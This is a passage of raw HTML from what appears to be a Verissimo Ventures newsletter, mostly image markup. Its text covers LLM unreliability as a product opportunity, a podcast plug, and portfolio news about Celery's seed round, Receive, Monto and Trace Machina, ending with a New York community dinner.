424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff8e0c90e-3a93-484c-9629-0027b07b0e23_898x308.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff8e0c90e-3a93-484c-9629-0027b07b0e23_898x308.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff8e0c90e-3a93-484c-9629-0027b07b0e23_898x308.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff8e0c90e-3a93-484c-9629-0027b07b0e23_898x308.png" width="620" height="212.65033407572383" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/f8e0c90e-3a93-484c-9629-0027b07b0e23_898x308.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:308,&quot;width&quot;:898,&quot;resizeWidth&quot;:620,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff8e0c90e-3a93-484c-9629-0027b07b0e23_898x308.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff8e0c90e-3a93-484c-9629-0027b07b0e23_898x308.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff8e0c90e-3a93-484c-9629-0027b07b0e23_898x308.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff8e0c90e-3a93-484c-9629-0027b07b0e23_898x308.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><strong>The unreliability of LLMs isn‚Äôt just a bug, it‚Äôs the foundational constraint that defines what‚Äôs worth building, how it should be built, and what defensibility even looks like in this new wave of AI-native products.</strong></p><p><span>Indeed, one could argue that unreliability is the </span><em>raison d'√™tre</em><span> for much of the application layer, </span><strong>it's the challenge that creates the opportunity for builders to deliver value</strong><span>.</span></p><p>Builders can‚Äôt wish the variance away. They have to choose where and how they handle it, and that choice is what determines whether their product is viable, differentiated, and durable.</p><p><strong>The best builders aren‚Äôt trying to beat the model. They‚Äôre building systems that expect it to fail, and still work anyway.</strong></p><p><span>Tune in to Verissimo‚Äôs Nitay Joffe, and Kostas Pardalis founder of </span><a href="https://www.typedef.ai/" rel="">Typedef</a><span>, as they chat with tech geniuses on </span><em><a href="https://techontherocks.show/" rel="">Tech on the Rocks</a></em><span>‚Äîwhere hardware, cloud, and all things future-tech meet over a virtual drink!</span></p><p><strong>Episode 18:</strong><span> Business Physics: How Brand, Pricing, and Product Design Define Success with Erik Swan - </span><a href="https://techontherocks.show/18" rel="">https://techontherocks.show/18</a></p><p><span>Reminder to check out our </span><a href="https://verissimo.vc/its-all-about-everything-founder-series" rel="">It‚Äôs All About Everything Series</a><span>!</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F173d7339-9823-4da6-a123-146d2099cb65_426x221.heic" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F173d7339-9823-4da6-a123-146d2099cb65_426x221.heic 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F173d7339-9823-4da6-a123-146d2099cb65_426x221.heic 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F173d7339-9823-4da6-a123-146d2099cb65_426x221.heic 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F173d7339-9823-4da6-a123-146d2099cb65_426x221.heic 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F173d7339-9823-4da6-a123-146d2099cb65_426x221.heic" width="208" height="107.90610328638498" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/173d7339-9823-4da6-a123-146d2099cb65_426x221.heic&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:221,&quot;width&quot;:426,&quot;resizeWidth&quot;:208,&quot;bytes&quot;:5295,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/heic&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://verissimo.substack.com/i/163015421?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F173d7339-9823-4da6-a123-146d2099cb65_426x221.heic&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F173d7339-9823-4da6-a123-146d2099cb65_426x221.heic 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F173d7339-9823-4da6-a123-146d2099cb65_426x221.heic 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F173d7339-9823-4da6-a123-146d2099cb65_426x221.heic 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F173d7339-9823-4da6-a123-146d2099cb65_426x221.heic 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>Celery recently announced a </span><strong><a href="https://www.calcalistech.com/ctechnews/article/rkhk00ogzel" rel="">$6.25 million Seed</a><span> </span></strong><span>round</span><strong> </strong><span>led by Team8. We wrote their first check and are excited to have participated in this latest round. </span></p><p><strong><a href="https://www.celeryway.com/" rel="">Celery</a></strong><span> is an AI-powered financial control platform that helps organizations catch costly payroll and revenue errors before they impact the bottom line. Designed for finance teams in high-volume, labor-intensive sectors like healthcare, Celery automatically audits thousands of records, flags policy violations, and uncovers unprofitable clients. By shifting from manual oversight to intelligent monitoring, Celery helps teams save time, improve accuracy, and take control of their financial data.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4acd3691-cf46-4b64-88d6-ad4f561d0bbc_1600x900.heic" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4acd3691-cf46-4b64-88d6-ad4f561d0bbc_1600x900.heic 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4acd3691-cf46-4b64-88d6-ad4f561d0bbc_1600x900.heic 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4acd3691-cf46-4b64-88d6-ad4f561d0bbc_1600x900.heic 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4acd3691-cf46-4b64-88d6-ad4f561d0bbc_1600x900.heic 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4acd3691-cf46-4b64-88d6-ad4f561d0bbc_1600x900.heic" width="211" height="118.6875" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/4acd3691-cf46-4b64-88d6-ad4f561d0bbc_1600x900.heic&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:819,&quot;width&quot;:1456,&quot;resizeWidth&quot;:211,&quot;bytes&quot;:20380,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/heic&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://verissimo.substack.com/i/163015421?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4acd3691-cf46-4b64-88d6-ad4f561d0bbc_1600x900.heic&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4acd3691-cf46-4b64-88d6-ad4f561d0bbc_1600x900.heic 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4acd3691-cf46-4b64-88d6-ad4f561d0bbc_1600x900.heic 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4acd3691-cf46-4b64-88d6-ad4f561d0bbc_1600x900.heic 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4acd3691-cf46-4b64-88d6-ad4f561d0bbc_1600x900.heic 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><strong><a href="https://www.nowreceive.com/" rel="">Receive</a><span> </span></strong><span>helps small and medium-sized businesses unlock instant access to cash from pending customer payments. Instead of waiting days for transactions to clear, merchants receive a virtual card with immediate funds tied to their receivables. Repayment happens automatically once the original payment is processed, making the experience seamless and hands-free. Offered both directly and through payment providers, Receive gives businesses faster cash flow without disrupting existing systems.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7860a907-0821-4d03-b38e-28d7ed0313cf_413x158.heic" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7860a907-0821-4d03-b38e-28d7ed0313cf_413x158.heic 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7860a907-0821-4d03-b38e-28d7ed0313cf_413x158.heic 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7860a907-0821-4d03-b38e-28d7ed0313cf_413x158.heic 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7860a907-0821-4d03-b38e-28d7ed0313cf_413x158.heic 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7860a907-0821-4d03-b38e-28d7ed0313cf_413x158.heic" width="229" height="87.60774818401937" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/7860a907-0821-4d03-b38e-28d7ed0313cf_413x158.heic&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:158,&quot;width&quot;:413,&quot;resizeWidth&quot;:229,&quot;bytes&quot;:10063,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/heic&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://verissimo.substack.com/i/163015421?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7860a907-0821-4d03-b38e-28d7ed0313cf_413x158.heic&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7860a907-0821-4d03-b38e-28d7ed0313cf_413x158.heic 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7860a907-0821-4d03-b38e-28d7ed0313cf_413x158.heic 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7860a907-0821-4d03-b38e-28d7ed0313cf_413x158.heic 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7860a907-0821-4d03-b38e-28d7ed0313cf_413x158.heic 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><strong><a href="https://montopay.com/" rel="">Monto</a><span> </span></strong><span>is streamlining enterprise billing by helping companies get paid faster with less manual work. Instead of navigating complex customer payment portals one by one, Monto connects to them all and automates the process of sending, tracking, and collecting invoices. By reducing friction in accounts receivable, Monto improves cash flow and frees up internal teams to focus on growth.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe62129ff-d17a-448c-9b5b-7b43adc8ed19_840x248.heic" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe62129ff-d17a-448c-9b5b-7b43adc8ed19_840x248.heic 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe62129ff-d17a-448c-9b5b-7b43adc8ed19_840x248.heic 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe62129ff-d17a-448c-9b5b-7b43adc8ed19_840x248.heic 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe62129ff-d17a-448c-9b5b-7b43adc8ed19_840x248.heic 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe62129ff-d17a-448c-9b5b-7b43adc8ed19_840x248.heic" width="294" height="86.8" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/e62129ff-d17a-448c-9b5b-7b43adc8ed19_840x248.heic&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:248,&quot;width&quot;:840,&quot;resizeWidth&quot;:294,&quot;bytes&quot;:29494,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/heic&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://verissimo.substack.com/i/163015421?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe62129ff-d17a-448c-9b5b-7b43adc8ed19_840x248.heic&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe62129ff-d17a-448c-9b5b-7b43adc8ed19_840x248.heic 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe62129ff-d17a-448c-9b5b-7b43adc8ed19_840x248.heic 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe62129ff-d17a-448c-9b5b-7b43adc8ed19_840x248.heic 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe62129ff-d17a-448c-9b5b-7b43adc8ed19_840x248.heic 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><strong><a href="https://tracemachina.com/" rel="">Trace Machina</a></strong><span> builds foundational software infrastructure for teams working on high-performance, safety-critical systems. It‚Äôs platform, NativeLink, is designed to accelerate complex code development, enabling faster builds, better simulation workflows, and significant savings on compute costs. It's especially well-suited for industries like aerospace, robotics, and advanced hardware, where reliability and speed matter most.</span></p><p><strong>Verissimo NYC Dinner</strong><br><span>Incredible night with the Verissimo Ventures community in NYC‚Äîfounders, LPs, and friends coming together to explore what‚Äôs ahead in AI, tech, and venture.</span><br><span>These moments remind us that meaningful relationships are at the heart of everything we‚Äôre building.</span><br><span>Grateful for the energy, insights, and shared vision around the table.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3c51d7d8-537b-4592-993f-c29326ad98c4_4032x3024.heic" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3c51d7d8-537b-4592-993f-c29326ad98c4_4032x3024.heic 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3c51d7d8-537b-4592-993f-c29326ad98c4_4032x3024.heic 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3c51d7d8-537b-4592-993f-c29326ad98c4_4032x3024.heic 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3c51d7d8-537b-4592-993f-c29326ad98c4_4032x3024.heic 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3c51d7d8-537b-4592-993f-c29326ad98c4_4032x3024.heic" width="327" height="245.25" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/3c51d7d8-537b-4592-993f-c29326ad98c4_4032x3024.heic&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1092,&quot;width&quot;:1456,&quot;resizeWidth&quot;:327,&quot;bytes&quot;:1977640,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:&quot;image/heic&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://verissimo.substack.com/i/163015421?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3c51d7d8-537b-4592-993f-c29326ad98c4_4032x3024.heic&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3c51d7d8-537b-4592-993f-c29326ad98c4_4032x3024.heic 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3c51d7d8-537b-4592-993f-c29326ad98c4_4032x3024.heic 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3c51d7d8-537b-4592-993f-c29326ad98c4_4032x3024.heic 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3c51d7d8-537b-4592-993f-c29326ad98c4_4032x3024.heic 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa7e13746-ff6a-4294-8ba3-1fd1fd1ce783_4032x3024.heic" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa7e13746-ff6a-4294-8ba3-1fd1fd1ce783_4032x3024.heic 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa7e13746-ff6a-4294-8ba3-1fd1fd1ce783_4032x3024.heic 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa7e13746-ff6a-4294-8ba3-1fd1fd1ce783_4032x3024.heic 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa7e13746-ff6a-4294-8ba3-1fd1fd1ce783_4032x3024.heic 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa7e13746-ff6a-4294-8ba3-1fd1fd1ce783_4032x3024.heic" width="313" height="234.75" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/a7e13746-ff6a-4294-8ba3-1fd1fd1ce783_4032x3024.heic&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1092,&quot;width&quot;:1456,&quot;resizeWidth&quot;:313,&quot;bytes&quot;:1901259,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:&quot;image/heic&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://verissimo.substack.com/i/163015421?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa7e13746-ff6a-4294-8ba3-1fd1fd1ce783_4032x3024.heic&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa7e13746-ff6a-4294-8ba3-1fd1fd1ce783_4032x3024.heic 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa7e13746-ff6a-4294-8ba3-1fd1fd1ce783_4032x3024.heic 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa7e13746-ff6a-4294-8ba3-1fd1fd1ce783_4032x3024.heic 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa7e13746-ff6a-4294-8ba3-1fd1fd1ce783_4032x3024.heic 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8df4796-7c65-4487-b9f6-9c6ecc98352c_3024x4032.heic" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8df4796-7c65-4487-b9f6-9c6ecc98352c_3024x4032.heic 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8df4796-7c65-4487-b9f6-9c6ecc98352c_3024x4032.heic 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8df4796-7c65-4487-b9f6-9c6ecc98352c_3024x4032.heic 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8df4796-7c65-4487-b9f6-9c6ecc98352c_3024x4032.heic 1456w" sizes="100vw"><img 